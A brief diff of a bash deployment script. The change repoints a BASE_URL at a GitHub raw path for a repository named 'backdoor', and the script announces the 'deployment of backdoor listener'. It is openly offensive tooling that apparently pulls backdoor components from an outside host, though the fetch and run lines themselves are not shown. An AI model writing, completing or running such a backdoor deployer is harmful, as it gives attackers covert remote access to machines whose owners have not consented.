@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # GitHub URL
-BASE_URL="https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash"
+BASE_URL="https://raw.githubusercontent.com/linathaniel/backdoor/main/Bash/backdoor"
 
 echo "- Starting deployment of backdoor listener..."
 
